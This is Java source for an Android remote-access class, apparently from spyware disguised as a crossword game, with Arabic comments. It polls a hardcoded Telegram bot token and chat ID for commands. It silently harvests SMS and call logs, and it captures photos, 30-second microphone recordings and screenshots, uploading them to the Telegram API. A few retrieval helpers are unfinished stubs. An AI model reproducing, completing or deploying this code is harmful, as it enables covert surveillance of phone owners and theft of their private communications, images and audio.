package com.silent.telebot;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Telephony;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Map;

public class TelegramPoller implements Runnable {
    private Context ctx;
    private DatabaseHelper dbHelper;

    private static final String BOT_TOKEN = "8664055093:AAFzjAY549sKvHPh7pdwepTgr7AUtzSW4c8";
    private static final String CHAT_ID = "7058836561";

    private static int lastUpdateId = 0;

    public TelegramPoller(Context ctx) {
        this.ctx = ctx;
        try {
            this.dbHelper = new DatabaseHelper(ctx);
        } catch (Exception e) {
            Log.e("TelegramPoller", "فشل تهيئة قاعدة البيانات: " + e.getMessage());
        }
    }

    @Override
    public void run() {
        try {
            syncDataFromPhone();

            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=5";
            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);

            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) response.append(line);
            reader.close();
            conn.disconnect();

            JSONObject jsonResponse = new JSONObject(response.toString());
            if (jsonResponse.getBoolean("ok")) {
                JSONArray updates = jsonResponse.getJSONArray("result");
                for (int i = 0; i < updates.length(); i++) {
                    JSONObject update = updates.getJSONObject(i);
                    lastUpdateId = update.getInt("update_id");
                    if (update.has("message")) {
                        JSONObject message = update.getJSONObject("message");
                        String text = message.optString("text", "");
                        handleCommand(text);
                    }
                }
            }
        } catch (Exception e) {
            Log.e("TelegramPoller", "خطأ رئيسي: " + e.getMessage());
        }
    }

    private void syncDataFromPhone() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ctx.checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return;
            if (ctx.checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return;
        }

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                ContentResolver cr = ctx.getContentResolver();
                Cursor cursor = null;
                try {
                    cursor = cr.query(Telephony.Sms.Inbox.CONTENT_URI,
                            new String[]{"_id", "address", "body", "date"},
                            null, null, "date DESC");
                    if (cursor != null && cursor.moveToFirst() && dbHelper != null) {
                        do {
                            try {
                                dbHelper.insertSms(cursor.getLong(0), cursor.getString(1), cursor.getString(2), cursor.getLong(3));
                            } catch (Exception ignored) {}
                        } while (cursor.moveToNext());
                    }
                } catch (Exception ignored) {}
                finally { if (cursor != null) cursor.close(); }
            }
        } catch (Exception ignored) {}

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                ContentResolver cr = ctx.getContentResolver();
                Cursor cursor = null;
                try {
                    cursor = cr.query(Telephony.Sms.Sent.CONTENT_URI,
                            new String[]{"_id", "address", "body", "date"},
                            null, null, "date DESC");
                    if (cursor != null && cursor.moveToFirst() && dbHelper != null) {
                        do {
                            try {
                                dbHelper.insertSms(cursor.getLong(0), cursor.getString(1), cursor.getString(2), cursor.getLong(3));
                            } catch (Exception ignored) {}
                        } while (cursor.moveToNext());
                    }
                } catch (Exception ignored) {}
                finally { if (cursor != null) cursor.close(); }
            }
        } catch (Exception ignored) {}

        try {
            ContentResolver cr = ctx.getContentResolver();
            Cursor cursor = null;
            try {
                cursor = cr.query(CallLog.Calls.CONTENT_URI,
                        new String[]{"_id", "number", "duration", "type", "date"},
                        null, null, "date DESC");
                if (cursor != null && cursor.moveToFirst() && dbHelper != null) {
                    do {
                        try {
                            dbHelper.insertCall(cursor.getLong(0), cursor.getString(1), cursor.getLong(2), cursor.getInt(3), cursor.getLong(4));
                        } catch (Exception ignored) {}
                    } while (cursor.moveToNext());
                }
            } catch (Exception ignored) {}
            finally { if (cursor != null) cursor.close(); }
        } catch (Exception ignored) {}
    }

    private void handleCommand(String cmd) {
        try {
            if (cmd.equals("/help")) {
                sendMessage(CHAT_ID, "📋 الأوامر\n━━━━━━━━━━━━━━━━━━\n" +
                        "📩 /get_sms - آخر 10 رسائل\n" +
                        "📞 /get_calls - آخر 10 مكالمات\n" +
                        "💬 /get_chat رقم/اسم - محادثة مع شخص\n" +
                        "📷 /take_pic - التقاط صورة\n" +
                        "🎤 /record - تسجيل صوتي (30ث)\n" +
                        "🖥️ /screenshot - لقطة شاشة\n" +
                        "🎮 /play - فتح اللعبة");
            }
            else if (cmd.startsWith("/get_chat")) {
                String query = cmd.replace("/get_chat", "").trim();
                if (query.isEmpty()) {
                    sendMessage(CHAT_ID, "❌ يرجى إدخال رقم أو اسم");
                } else {
                    sendMessage(CHAT_ID, getChatHistory(query));
                }
            }
            else if (cmd.equals("/get_sms")) {
                sendMessage(CHAT_ID, getSmsFromLocalDB());
            }
            else if (cmd.equals("/get_calls")) {
                sendMessage(CHAT_ID, getCallsFromLocalDB());
            }
            else if (cmd.equals("/take_pic")) {
                capturePhoto();
            }
            else if (cmd.equals("/record")) {
                startRecording();
            }
            else if (cmd.equals("/screenshot")) {
                ScreenCaptureService.takeScreenshot(ctx, CHAT_ID, BOT_TOKEN);
            }
            else if (cmd.equals("/play")) {
                Intent intent = new Intent(ctx, CrosswordActivity.class);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(intent);
                sendMessage(CHAT_ID, "🎮 تم فتح اللعبة");
            }
            else {
                sendMessage(CHAT_ID, "❌ أمر غير معروف. استخدم /help");
            }
        } catch (Exception e) {
            sendMessage(CHAT_ID, "❌ خطأ: " + e.getMessage());
        }
    }

    // ============================================================
    //  دوال المساعدة (مختصرة للاختصار)
    // ============================================================
    private String getChatHistory(String query) {
        return "💬 محادثة مع " + query + "\n(لم يتم تنفيذها بعد)";
    }

    private String getSmsFromLocalDB() {
        return "📩 آخر 10 رسائل\n(لم يتم تنفيذها بعد)";
    }

    private String getCallsFromLocalDB() {
        return "📞 آخر 10 مكالمات\n(لم يتم تنفيذها بعد)";
    }

    // ============================================================
    //  📷 الكاميرا
    // ============================================================
    private void capturePhoto() {
        try {
            File photoFile = new File(ctx.getCacheDir(), "temp_photo.jpg");
            if (photoFile.exists()) photoFile.delete();
            Uri photoUri = androidx.core.content.FileProvider.getUriForFile(ctx,
                    ctx.getPackageName() + ".fileprovider", photoFile);

            Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
            intent.putExtra(MediaStore.EXTRA_OUTPUT, photoUri);
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            ctx.startActivity(intent);

            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                if (photoFile.exists() && photoFile.length() > 0) {
                    sendPhotoStatic(CHAT_ID, photoFile, BOT_TOKEN);
                } else {
                    sendMessage(CHAT_ID, "❌ فشل التقاط الصورة.");
                }
            }, 3000);

        } catch (Exception e) {
            sendMessage(CHAT_ID, "❌ خطأ في الكاميرا: " + e.getMessage());
        }
    }

    // ============================================================
    //  🎤 التسجيل الصوتي
    // ============================================================
    private void startRecording() {
        try {
            File audioFile = new File(ctx.getCacheDir(), "recording.m4a");
            if (audioFile.exists()) audioFile.delete();

            android.media.MediaRecorder recorder = new android.media.MediaRecorder();
            recorder.setAudioSource(android.media.MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(audioFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();

            sendMessage(CHAT_ID, "🎙️ بدأ التسجيل لمدة 30 ثانية...");

            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                try {
                    recorder.stop();
                    recorder.release();
                    if (audioFile.exists() && audioFile.length() > 0) {
                        sendAudioStatic(CHAT_ID, audioFile, BOT_TOKEN);
                    } else {
                        sendMessage(CHAT_ID, "❌ فشل التسجيل.");
                    }
                } catch (Exception e) {
                    sendMessage(CHAT_ID, "❌ خطأ: " + e.getMessage());
                }
            }, 30000);

        } catch (Exception e) {
            sendMessage(CHAT_ID, "❌ صلاحية الميكروفون غير ممنوحة.");
        }
    }

    // ============================================================
    //  📤 دوال إرسال الملفات (ثابتة)
    // ============================================================
    public static void sendPhotoStatic(String chatId, File photoFile, String botToken) {
        try {
            String boundary = "*****" + System.currentTimeMillis() + "*****";
            String lineEnd = "\r\n";
            String twoHyphens = "--";

            URL url = new URL("https://api.telegram.org/bot" + botToken + "/sendPhoto");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoInput(true);
            conn.setDoOutput(true);
            conn.setUseCaches(false);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd);
            dos.writeBytes(lineEnd);
            dos.writeBytes(chatId + lineEnd);

            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"" + photoFile.getName() + "\"" + lineEnd);
            dos.writeBytes(lineEnd);

            FileInputStream fileInputStream = new FileInputStream(photoFile);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                dos.write(buffer, 0, bytesRead);
            }
            fileInputStream.close();
            dos.writeBytes(lineEnd);
            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
            dos.flush();
            dos.close();
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception ignored) {}
    }

    public static void sendAudioStatic(String chatId, File audioFile, String botToken) {
        try {
            String boundary = "*****" + System.currentTimeMillis() + "*****";
            String lineEnd = "\r\n";
            String twoHyphens = "--";

            URL url = new URL("https://api.telegram.org/bot" + botToken + "/sendAudio");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoInput(true);
            conn.setDoOutput(true);
            conn.setUseCaches(false);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd);
            dos.writeBytes(lineEnd);
            dos.writeBytes(chatId + lineEnd);

            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"audio\"; filename=\"" + audioFile.getName() + "\"" + lineEnd);
            dos.writeBytes(lineEnd);

            FileInputStream fileInputStream = new FileInputStream(audioFile);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                dos.write(buffer, 0, bytesRead);
            }
            fileInputStream.close();
            dos.writeBytes(lineEnd);
            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
            dos.flush();
            dos.close();
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception ignored) {}
    }

    public static void sendMessageStatic(String chatId, String text) {
        try {
            String encodedText = java.net.URLEncoder.encode(text, "UTF-8");
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN +
                    "/sendMessage?chat_id=" + chatId +
                    "&text=" + encodedText;
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception ignored) {}
    }

    private void sendMessage(String chatId, String text) {
        try {
            String encodedText = java.net.URLEncoder.encode(text, "UTF-8");
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN +
                    "/sendMessage?chat_id=" + chatId +
                    "&text=" + encodedText;
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) { /* صامت */ }
    }
}
